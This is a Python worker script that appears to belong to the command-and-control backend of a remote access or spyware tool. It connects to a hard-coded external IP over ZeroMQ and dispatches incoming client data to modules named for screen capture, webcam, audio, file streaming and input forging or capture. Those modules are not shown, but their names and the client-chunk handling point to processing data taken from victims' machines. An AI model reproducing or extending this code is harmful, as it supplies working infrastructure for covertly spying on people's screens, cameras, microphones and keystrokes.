import asyncio
import json
import zmq
import zmq.asyncio
import multiprocessing
from LoggerWrapper import Log as logger

ZMQ_PULL_ADDR = "tcp://188.190.156.120:5555"

async def worker_task(worker_id: str):
    zmq_ctx = zmq.asyncio.Context()
    pull_socket = zmq_ctx.socket(zmq.PULL)
    pull_socket.connect(ZMQ_PULL_ADDR)

    from Modules import module_map, data_scribe, screen_watch, bin_stream, echo_tap, cam_gaze, input_forge

    logger.info(f"[+] Worker {worker_id} started and connected to {ZMQ_PULL_ADDR}")

    while True:
        try:
            frames = await pull_socket.recv_multipart()
            if not frames:
                continue

            header = json.loads(frames[0])
            client_id = header.get("client_id", "?")
            module_name = header.get("module_name", "")
            chunk_count = header.get("chunk_count", 0)

            func = module_map.get(module_name)
            if not func:
                continue  # игнорируем неизвестные модули

            for idx, chunk in enumerate(frames[1:]):
                try:
                    func(chunk)
                except Exception as e:
                    logger.error(
                        f"[Worker {worker_id}] Error processing chunk {idx+1}/{chunk_count} "
                        f"of module '{module_name}': {e}"
                    )

        except Exception as e:
            logger.error(f"[Worker {worker_id}] General error: {e}")
            await asyncio.sleep(0.01)


def module_worker(log_queue):
    worker_id = multiprocessing.current_process().name
    logger.for_worker(log_queue)
    asyncio.run(worker_task(worker_id))
